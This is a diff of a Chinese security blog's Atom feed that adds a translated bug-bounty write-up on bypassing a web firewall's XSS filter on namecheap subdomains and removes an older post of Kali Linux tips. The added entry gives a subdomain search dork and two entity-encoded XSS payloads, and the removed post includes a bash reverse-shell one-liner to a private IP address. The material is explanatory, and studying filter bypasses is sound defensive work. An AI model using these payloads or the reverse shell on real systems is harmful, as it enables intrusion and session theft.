@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-12-23T06:58:59.404Z</updated>
+  <updated>2018-12-23T07:51:13.292Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -14,6 +14,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>第八篇翻译：绕过XSS防护</title>
+    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%85%AB%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E7%BB%95%E8%BF%87XSS%E9%98%B2%E6%8A%A4/"/>
+    <id>http://TimeS0ng.github.io/2018/12/23/第八篇翻译：绕过XSS防护/</id>
+    <published>2018-12-23T07:50:57.000Z</published>
+    <updated>2018-12-23T07:51:13.292Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="原文：The-story-behined-the-Strong-XSS-filter-bypass"><a href="#原文：The-story-behined-the-Strong-XSS-filter-bypass" class="headerlink" title="原文：The story behined the Strong XSS filter bypass!"></a>原文：<a href="https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3" target="_blank" rel="external">The story behined the Strong XSS filter bypass!</a></h4><h4 id="漏洞：编码绕过XSS防火墙"><a href="#漏洞：编码绕过XSS防火墙" class="headerlink" title="漏洞：编码绕过XSS防火墙"></a>漏洞：编码绕过XSS防火墙</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
+<h4 id="emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下"><a href="#emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下" class="headerlink" title="&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下"></a>&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.*.namecheap.com” &amp; site:*.namecheap.com</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"><a href="#emsp-emsp-好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏" class="headerlink" title="&emsp;&emsp;好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"></a>&emsp;&emsp;好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png" alt=""></p>
+<h4 id="emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙了"><a href="#emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙了" class="headerlink" title="&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙了"></a>&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;document&amp;period;domain&amp;rpar;&quot;&gt;Click Here&lt;/a&gt;</div><div class="line">&quot;&gt;&lt;iframe/src=javascript&amp;colon;[document&amp;period;domain].find(alert(1))&gt;</div></pre></td></tr></table></figure>
+<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><p>[*]xss-1</p>
+<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-1.mp4"><br></video>
+
+
+
+<p>[*]xss-2</p>
+<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-2.mp4"><br></video>
+
+
+
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;原文：The-story-behined-the-Strong-XSS-filter-bypass&quot;&gt;&lt;a href=&quot;#原文：The-story-behined-the-Strong-XSS-filter-bypass&quot; class=&quot;headerlink&quot; title=&quot;原文：The story behined the Strong XSS filter bypass!&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The story behined the Strong XSS filter bypass!&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：编码绕过XSS防火墙&quot;&gt;&lt;a href=&quot;#漏洞：编码绕过XSS防火墙&quot; class=&quot;headerlink&quot; title=&quot;漏洞：编码绕过XSS防火墙&quot;&gt;&lt;/a&gt;漏洞：编码绕过XSS防火墙&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@Skylinearafat?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Yeasir Arafat&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：中&quot;&gt;&lt;a href=&quot;#难度：中&quot; class=&quot;headerlink&quot; title=&quot;难度：中&quot;&gt;&lt;/a&gt;难度：中&lt;/h4&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>第七篇翻译：bypass CSRF</title>
@@ -864,103 +897,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;0x00-iodine简介&quot;&gt;&lt;a href=&quot;#0x00-iodine简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. iodine简介&quot;&gt;&lt;/a&gt;0x00. iodine简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;a href=&quot;#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&lt;/h4&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>kali使用入坑指南(一)</title>
-    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89/"/>
-    <id>http://TimeS0ng.github.io/2018/03/01/kali使用入坑指南（一）/</id>
-    <published>2018-03-01T12:25:58.000Z</published>
-    <updated>2018-12-18T15:30:06.977Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"><a href="#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！" class="headerlink" title="&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"></a>&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！</h4><a id="more"></a>
-<h2 id="0x01-kali安装中文输入法"><a href="#0x01-kali安装中文输入法" class="headerlink" title="0x01. kali安装中文输入法"></a>0x01. kali安装中文输入法</h2><blockquote>
-<ol>
-<li>下载ibus</li>
-</ol>
-<p>apt-get install ibus ibus-pinyin</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093227_Bi7qWn_Screenshot.jpeg)</p>
-<blockquote>
-<ol>
-<li>设置language，之后重启系统就能使用中文，不必太麻烦</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093613_rmRK04_Screenshot.jpeg)</p>
-<h2 id="0x02-kali中安装截图软件-shutter"><a href="#0x02-kali中安装截图软件-shutter" class="headerlink" title="0x02. kali中安装截图软件 shutter"></a>0x02. kali中安装截图软件 shutter</h2><blockquote>
-<p>apt-get install shutter</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201713_O1AXhi_Screenshot.jpeg)</p>
-<blockquote>
-<p>下面就是我用shutter截的桌面图片</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201931_pWfnu9_Screenshot.jpeg)</p>
-<h2 id="0x03-kali-安装硬件检测软件-hardinfo"><a href="#0x03-kali-安装硬件检测软件-hardinfo" class="headerlink" title="0x03. kali 安装硬件检测软件 hardinfo"></a>0x03. kali 安装硬件检测软件 hardinfo</h2><blockquote>
-<p>apt-get install hardinfo</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170704_ALlIlf_Screenshot.jpeg)</p>
-<blockquote>
-<p>hardinfo可以让我们轻松的查看系统硬件配置，其功能有点像鲁大师，不过我却没用过鲁大师哈哈哈哈！</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170842_Vw0EnH_Screenshot.jpeg)</p>
-<h2 id="0x04-kali-录屏软件-EasyScreenCast"><a href="#0x04-kali-录屏软件-EasyScreenCast" class="headerlink" title="0x04. kali 录屏软件 EasyScreenCast"></a>0x04. kali 录屏软件 EasyScreenCast</h2><blockquote>
-<p>今天笔者也利用kali中自带的录屏软件 EasyScreenCast 录了一个Wi-Fi破解的视频放到B站，如果感兴趣可以<a href="https://www.bilibili.com/video/av20318401/" target="_blank" rel="external">戳这里</a>。EasyScreenCast 使用简单方便，根据自己需要稍稍修改一下参数就能录制满足自己简单要求的视频。</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303171817_6QKqw8_Screenshot.jpeg)</p>
-<h2 id="0x05-kali-音乐播放器-VLC"><a href="#0x05-kali-音乐播放器-VLC" class="headerlink" title="0x05. kali 音乐播放器 VLC"></a>0x05. kali 音乐播放器 VLC</h2><blockquote>
-<p>虽然 VLC 没有像 Mac 版QQ 音乐那么唯美的优化，但我们也不能对开源如此苛刻，毕竟它从没令我失望过！</p>
-<p>apt-get install vlc</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191548_k9LYCB_Screenshot.jpeg)</p>
-<blockquote>
-<p>安装完成之后，因为它默认不能以root账号启动，所以我们需要修改 /usr/bin/vlc 文件，将原来的geteuid 修改为现在的 getppid</p>
-<p>hexedit /usr/bin/vlc</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191650_jLTfN6_Screenshot.jpeg)</p>
-<blockquote>
-<p>在终端输入 vlc 就能调出</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303193126_rzgeBG_Screenshot.jpeg)</p>
-<h2 id="0x06-kali-使用bash-一句话反弹shell"><a href="#0x06-kali-使用bash-一句话反弹shell" class="headerlink" title="0x06. kali 使用bash 一句话反弹shell"></a>0x06. kali 使用bash 一句话反弹shell</h2><blockquote>
-<p>进行渗透测试时经常遇到Linux 中不存在 nc 或者 nc 一经反弹shell就出现各种报错，直到遇到bash 一句话后麻麻再也不用担心我拿不到shell 啦！！</p>
-<p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303192839_XDBQbF_Screenshot.jpeg)</p>
-<h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
-<p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
-<p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195304_KAYICq_Screenshot.jpeg)</p>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195334_duCLPP_Screenshot.jpeg)</p>
-<h2 id="0x08-kali-使用squid3-作http-代理"><a href="#0x08-kali-使用squid3-作http-代理" class="headerlink" title="0x08. kali 使用squid3 作http 代理"></a>0x08. kali 使用squid3 作http 代理</h2><blockquote>
-<p>squid3 可以很方便的帮助我们搭建内网的http 代理服务器，当我们启动squid3 之后它会默认启动3128 端口，我们只需要在浏览器设置代理就可以使用了。不过在这之前我们首先应该修改squid3 的默认配置，将 /etc/squid/squid.conf 中的http_access deny all 修改为http_access allow all 这样才能作为代理服务器使用</p>
-<p>vim /etc/squid/squid.conf</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305175930_Xks0id_Screenshot.jpeg)</p>
-<blockquote>
-<p>squid3</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180011_6T2Daa_Screenshot.jpeg)</p>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180036_Uxee4d_Screenshot.jpeg)</p>
-<h2 id="0x09-kali-安装翻译字典"><a href="#0x09-kali-安装翻译字典" class="headerlink" title="0x09. kali 安装翻译字典"></a>0x09. kali 安装翻译字典</h2><blockquote>
-<p>goldendict 是Linux 中字典的不二选择，同时它还支持选词翻译，这是一个相当不错的功能。笔者因为给自己定了个目标要看kali 官网的教程，所以只有去读英文资料，而goldendict 帮了我不小的忙！</p>
-<p>下载好goldendict 之后需要稍稍配置一下词典Edict-&gt;dict-&gt;website，增加youdao 的翻译网址 <a href="http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8" target="_blank" rel="external">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</a></p>
-<p>之后我们选中单词按 CTRL+C+C 就可以随时翻译了</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305231416_6b8vJS_Screenshot.jpeg)</p>
-<h2 id="0x10-kali-安装插件"><a href="#0x10-kali-安装插件" class="headerlink" title="0x10. kali 安装插件"></a>0x10. kali 安装插件</h2><blockquote>
-<p>使用浏览器访问 <a href="http://extensions.gnome.org" target="_blank" rel="external">http://extensions.gnome.org</a> 就可以给kali 安装扩展，安装netspeed 插件之后就可以监控网络流量</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305235955_Y7cZTJ_Screenshot.jpeg)</p>
-<h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;a href=&quot;#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&lt;/h4&gt;
     
     </summary>
     
